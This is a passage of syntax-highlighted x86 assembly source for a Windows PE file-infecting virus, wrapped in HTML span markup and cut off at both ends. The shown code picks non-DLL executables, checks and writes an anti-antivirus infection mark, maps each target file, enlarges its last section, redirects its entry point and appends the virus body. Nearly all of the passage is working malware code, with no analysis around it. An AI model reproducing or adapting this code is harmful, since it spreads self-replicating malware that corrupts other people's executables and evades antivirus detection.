 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                           </span><span class="sc1">; Check if file is corrupted</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckPESign</span><span class="sc0">          </span><span class="sc1">; Check for PE-Header</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">
                           </span><span class="sc1">; Check Infection Mark</span><span class="sc0">
                           </span><span class="sc1">; --&amp;gt; A-AV ( Anti- Anti-Virus )</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'VA-A'</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc1">; Get Characteristics</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">            </span><span class="sc1">; select Dll-Flag</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02000h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">           </span><span class="sc1">; we won't no DLL Files</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc1">; Check for DLL-Files</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00002h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00002h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Notagoodfile</span><span class="sc0">         

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectEXE</span><span class="sc0">            </span><span class="sc1">; Infect this sucker !</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoInfection</span><span class="sc0">

</span><span class="sc5">Notagoodfile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnMapFile</span><span class="sc0">

</span><span class="sc5">NoInfection</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ------------------------------[ File-Handling ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
                           </span><span class="sc1">; FileName needs to be in esi</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Open Files</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; Filename is in ESI</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateFileA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Closed</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">CreateMap</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; Get Map-Site</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">              </span><span class="sc1">; Datei wieder...</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XMapViewOfFile</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UnMapFile</span><span class="sc0">
                           </span><span class="sc1">; EAX contains starting offset of the map</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">UnMapFile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnMapFile2</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Closed</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">UnMapFile2</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">ret</span><span class="sc0">

  
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ---------------------[ Infection of the EXE-File ]-------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">InfectEXE</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; MapAddress contains the start address of the file</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; esi points to PE-Header</span><span class="sc0">
                           </span><span class="sc1">; ecx = Alignment Faktor</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> 
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
 
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc9">Align</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NewSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">pushad</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnMapFile2</span><span class="sc0">           </span><span class="sc1">; remap file</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateMap</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NoEXE</span><span class="sc0">
                           </span><span class="sc1">; esi = PE-Header</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">; edi = esi</span><span class="sc0">
                           </span><span class="sc1">; eax = Sections</span><span class="sc0">
                           </span><span class="sc1">; get last section</span><span class="sc0">
 </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">              </span><span class="sc1">; point to Directory Table</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get Directory Entrys</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                           </span><span class="sc1">; get EIP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                           </span><span class="sc1">; get Imagebase</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get size of RAW-Data</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; edx = points to raw-data</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; EAX contains now Start of our file</span><span class="sc0">
                           </span><span class="sc1">; but we need to point it to the second part of the virus</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SecondPart</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImageBase</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gap1</span><span class="sc0">
                           </span><span class="sc1">; the 0A00h are caused by the uninitialized data</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NewEIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; enlarge Raw-Data</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">        </span><span class="sc1">; VirusSize = Size of entire file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; align it</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc9">Align</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; save in file</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; new Virtual-Size</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get new imagesize</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                           </span><span class="sc1">; change the section flags</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0000020h</span><span class="sc0">
                           </span><span class="sc1">; Write infection mark to file</span><span class="sc0">
                           </span><span class="sc1">; --&amp;gt; A-AV ( Anti- Anti-Virus )</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'VA-A'</span><span class="sc0">

 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                           </span><span class="sc1">; save the start of the virus in file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">StartofVirusinFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenMyself</span><span class="sc0">
                           </span><span class="sc1">; lets save the right Imagebase and EIP</span><span class="sc0">
                           </span><span class="sc1">; inside our buffered file ;)</span><span class="sc0">

                           </span><span class="sc1">; Save EIP &amp;amp; Imagebase </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileBuffer</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">retEIP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImageBase</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gap1</span><span class="sc0">
 </span><span class="sc6">stosd</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldBase</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileBuffer</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">retBas</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImageBase</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gap1</span><span class="sc0"> 
 </span><span class="sc6">stosd</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileBuffer</span><span class="sc0"> 
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">        </span><span class="sc1">; First Part</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">; append</span><span class="sc0">
                           </span><span class="sc1">; we need two steps, otherwise we would fill the</span><span class="sc0">

 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InfCounter</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">NoEXE</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -------------------------[ Open Us-Prozedur ]------------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc5">OpenMyself</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; this Procedure returns the start of</span><span class="sc0">
                           </span><span class="sc1">; the current file in esi </span><span class="sc0">
                           </span><span class="sc1">; first we need the filename</span><span class="sc0">
 </span><span class="sc6">pushad</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetCommandLineA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
